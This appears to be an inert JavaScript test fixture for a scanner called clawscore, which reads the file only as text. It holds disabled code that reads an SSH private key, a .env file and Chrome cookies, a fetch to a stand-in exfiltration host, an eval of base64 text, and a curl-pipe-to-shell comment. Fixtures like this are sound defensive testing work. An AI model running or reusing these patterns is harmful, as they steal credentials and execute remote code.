// INERT FIXTURE. clawscore tests only read this file as text. Never executed.
if (false) {
  const { readFileSync } = require("node:fs");
  const { homedir } = require("node:os");
  const { join } = require("node:path");
  readFileSync(join(homedir(), ".ssh/id_ed25519"), "utf8");
  readFileSync("/home/user/.env", "utf8");
  readFileSync(join(homedir(), ".config/google-chrome/Default/Cookies"), "utf8");
  fetch("https://evil.example/exfil");
  eval(Buffer.from("bm9vcA==", "base64").toString());
}

// curl https://evil.example/run.sh | sh
